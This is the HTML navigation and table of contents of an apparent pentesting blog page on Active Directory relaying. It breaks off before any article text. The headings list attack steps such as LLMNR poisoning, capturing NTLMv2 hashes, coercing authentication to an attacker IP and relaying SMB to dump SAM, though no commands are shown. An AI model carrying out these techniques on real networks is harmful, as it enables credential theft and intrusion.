
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Projects Showcase">
      
      
      
        <link rel="canonical" href="http://blog.cuhawk.co.uk/pentesting/relaying/">
      
      
        <link rel="prev" href="../linux/">
      
      
        <link rel="next" href="../cobalt/">
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.0, mkdocs-material-9.5.27">
    
    
      
        <title>Relaying - Cuhawk's Blog</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.6543a935.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#relaying-poisoning" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="Cuhawk&#39;s Blog" class="md-header__button md-logo" aria-label="Cuhawk's Blog" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Cuhawk's Blog
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Relaying
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="blue-grey" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
    <li class="md-tabs__item">
      <a href="../.." class="md-tabs__link">
        
  
    
  
  Home

      </a>
    </li>
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../programming/" class="md-tabs__link">
          
  
  Programming

        </a>
      </li>
    
  

      
        
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="../" class="md-tabs__link">
          
  
  Pentesting

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../certifications/oscp/" class="md-tabs__link">
          
  
  Certifications

        </a>
      </li>
    
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Cuhawk&#39;s Blog" class="md-nav__button md-logo" aria-label="Cuhawk's Blog" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    Cuhawk's Blog
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Home
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Programming
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Programming
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../programming/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DSA
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../programming/DSA/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DFS vs BFS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../programming/bitwise/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bitwise
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../programming/Reverse/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Reversing Bits
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../programming/Maximize%20shortcut%20nodes/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Max Number of Edges
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../programming/Sorting%20Idealogy/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Sorting Idealogy
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../programming/Tree%20Use%20Idealogy/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Tree Use Idealogy
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../programming/React/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ReactJS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../programming/Snake/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Snake C++
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../programming/Booking%20API%20C%23/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Booking API
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../programming/GameServer/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Game Server
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../programming/Milk%20App%20c%23/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Milk Storage C#
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
      
        
        
      
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Pentesting
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Pentesting
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Home
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Evasion/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Evasion
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../linux/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux AD
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    Relaying
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    Relaying
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#poisoning" class="md-nav__link">
    <span class="md-ellipsis">
      Poisoning
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#llmnr-nbt-ns" class="md-nav__link">
    <span class="md-ellipsis">
      LLMNR &amp; NBT-NS
    </span>
  </a>
  
    <nav class="md-nav" aria-label="LLMNR & NBT-NS">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#responder" class="md-nav__link">
    <span class="md-ellipsis">
      Responder
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Responder">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#analyse-mode" class="md-nav__link">
    <span class="md-ellipsis">
      Analyse mode
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#poison-requests" class="md-nav__link">
    <span class="md-ellipsis">
      Poison Requests
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#inveigh" class="md-nav__link">
    <span class="md-ellipsis">
      Inveigh
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Inveigh">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#analyse-mode_1" class="md-nav__link">
    <span class="md-ellipsis">
      Analyse mode
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#run-inveigh" class="md-nav__link">
    <span class="md-ellipsis">
      Run inveigh
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-data-from-hashtable" class="md-nav__link">
    <span class="md-ellipsis">
      Get data from hashtable
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-all-captured-ntlmv2-challengeresponse-hashes" class="md-nav__link">
    <span class="md-ellipsis">
      Get all captured NTLMv2 challenge/response hashes
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#stop" class="md-nav__link">
    <span class="md-ellipsis">
      Stop
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enable-real-time-console-output" class="md-nav__link">
    <span class="md-ellipsis">
      Enable real time console output
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#clear-hashtable" class="md-nav__link">
    <span class="md-ellipsis">
      Clear hashtable
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-inveigh" class="md-nav__link">
    <span class="md-ellipsis">
      Get-Inveigh
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#active-directory-integrated-dns" class="md-nav__link">
    <span class="md-ellipsis">
      Active Directory-Integrated DNS
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Active Directory-Integrated DNS">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#check-wins-forward-lookup" class="md-nav__link">
    <span class="md-ellipsis">
      Check WINS forward lookup
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-adidns-permissions" class="md-nav__link">
    <span class="md-ellipsis">
      Check ADIDNS permissions
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-for-wildcard-record" class="md-nav__link">
    <span class="md-ellipsis">
      Check for wildcard record
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#create-wildcard-record" class="md-nav__link">
    <span class="md-ellipsis">
      Create wildcard record
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#give-other-groups-permissions-to-the-record" class="md-nav__link">
    <span class="md-ellipsis">
      Give other groups permissions to the record
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enable-tombstoned-record" class="md-nav__link">
    <span class="md-ellipsis">
      Enable tombstoned record
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tombstone-record" class="md-nav__link">
    <span class="md-ellipsis">
      Tombstone record
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cleanup-record" class="md-nav__link">
    <span class="md-ellipsis">
      Cleanup record
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-dns" class="md-nav__link">
    <span class="md-ellipsis">
      Check DNS
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#inveigh_1" class="md-nav__link">
    <span class="md-ellipsis">
      Inveigh
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mitm6" class="md-nav__link">
    <span class="md-ellipsis">
      Mitm6
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#files" class="md-nav__link">
    <span class="md-ellipsis">
      Files
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Files">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#link-file" class="md-nav__link">
    <span class="md-ellipsis">
      Link file
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#url-file" class="md-nav__link">
    <span class="md-ellipsis">
      URL file
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#searchconnector" class="md-nav__link">
    <span class="md-ellipsis">
      SearchConnector
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#1x1-image-in-emails" class="md-nav__link">
    <span class="md-ellipsis">
      1x1 image in Emails
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#for-other-filetypes-check-out-the-tools-listed" class="md-nav__link">
    <span class="md-ellipsis">
      For other filetypes check out the tools listed
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#coercing" class="md-nav__link">
    <span class="md-ellipsis">
      Coercing
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Coercing">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#check-which-coercer-methods-are-available" class="md-nav__link">
    <span class="md-ellipsis">
      Check which coercer methods are available
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#force-auth-to-attacker-ip" class="md-nav__link">
    <span class="md-ellipsis">
      Force auth to attacker IP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#webdav-auth" class="md-nav__link">
    <span class="md-ellipsis">
      WEBDAV auth
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#relaying" class="md-nav__link">
    <span class="md-ellipsis">
      Relaying
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Relaying">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#smb-relaying" class="md-nav__link">
    <span class="md-ellipsis">
      SMB relaying
    </span>
  </a>
  
    <nav class="md-nav" aria-label="SMB relaying">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#check-for-smb-hosts-without-smb-signing" class="md-nav__link">
    <span class="md-ellipsis">
      Check for SMB hosts without SMB signing
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#relay-requests-smb-and-dump-sam" class="md-nav__link">
    <span class="md-ellipsis">
      Relay requests SMB and dump SAM
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#relay-requests-smb-and-keep-smb-sessions-open" class="md-nav__link">
    <span class="md-ellipsis">
      Relay requests SMB and keep SMB sessions open
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ldap-relaying" class="md-nav__link">
    <span class="md-ellipsis">
      LDAP Relaying
    </span>
  </a>
  
    <nav class="md-nav" aria-label="LDAP Relaying">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#check-ldap-signing-or-binding" class="md-nav__link">
    <span class="md-ellipsis">
      Check LDAP Signing or Binding
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#resource-based-constraind-delegation-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      Resource Based Constraind Delegation attacks
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../cobalt/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cobalt Strike
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Certifications
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Certifications
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../certifications/oscp/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    OSCP
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../certifications/osep/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    OSEP
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../certifications/crte/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CRTE
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../certifications/prolabs/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB ProLabs
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#poisoning" class="md-nav__link">
    <span class="md-ellipsis">
      Poisoning
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#llmnr-nbt-ns" class="md-nav__link">
    <span class="md-ellipsis">
      LLMNR &amp; NBT-NS
    </span>
  </a>
  
    <nav class="md-nav" aria-label="LLMNR & NBT-NS">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#responder" class="md-nav__link">
    <span class="md-ellipsis">
      Responder
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Responder">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#analyse-mode" class="md-nav__link">
    <span class="md-ellipsis">
      Analyse mode
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#poison-requests" class="md-nav__link">
    <span class="md-ellipsis">
      Poison Requests
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#inveigh" class="md-nav__link">
    <span class="md-ellipsis">
      Inveigh
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Inveigh">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#analyse-mode_1" class="md-nav__link">
    <span class="md-ellipsis">
      Analyse mode
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#run-inveigh" class="md-nav__link">
    <span class="md-ellipsis">
      Run inveigh
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-data-from-hashtable" class="md-nav__link">
    <span class="md-ellipsis">
      Get data from hashtable
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-all-captured-ntlmv2-challengeresponse-hashes" class="md-nav__link">
    <span class="md-ellipsis">
      Get all captured NTLMv2 challenge/response hashes
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#stop" class="md-nav__link">
    <span class="md-ellipsis">
      Stop
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enable-real-time-console-output" class="md-nav__link">
    <span class="md-ellipsis">
      Enable real time console output
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#clear-hashtable" class="md-nav__link">
    <span class="md-ellipsis">
      Clear hashtable
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-inveigh" class="md-nav__link">
    <span class="md-ellipsis">
      Get-Inveigh
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#active-directory-integrated-dns" class="md-nav__link">
    <span class="md-ellipsis">
      Active Directory-Integrated DNS
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Active Directory-Integrated DNS">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#check-wins-forward-lookup" class="md-nav__link">
    <span class="md-ellipsis">
      Check WINS forward lookup
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-adidns-permissions" class="md-nav__link">
    <span class="md-ellipsis">
      Check ADIDNS permissions
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-for-wildcard-record" class="md-nav__link">
    <span class="md-ellipsis">
      Check for wildcard record
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#create-wildcard-record" class="md-nav__link">
    <span class="md-ellipsis">
      Create wildcard record
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#give-other-groups-permissions-to-the-record" class="md-nav__link">
    <span class="md-ellipsis">
      Give other groups permissions to the record
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enable-tombstoned-record" class="md-nav__link">
    <span class="md-ellipsis">
      Enable tombstoned record
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tombstone-record" class="md-nav__link">
    <span class="md-ellipsis">
      Tombstone record
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cleanup-record" class="md-nav__link">
    <span class="md-ellipsis">
      Cleanup record
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-dns" class="md-nav__link">
    <span class="md-ellipsis">
      Check DNS
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#inveigh_1" class="md-nav__link">
    <span class="md-ellipsis">
      Inveigh
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mitm6" class="md-nav__link">
    <span class="md-ellipsis">
      Mitm6
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#files" class="md-nav__link">
    <span class="md-ellipsis">
      Files
    </span>
  </a>
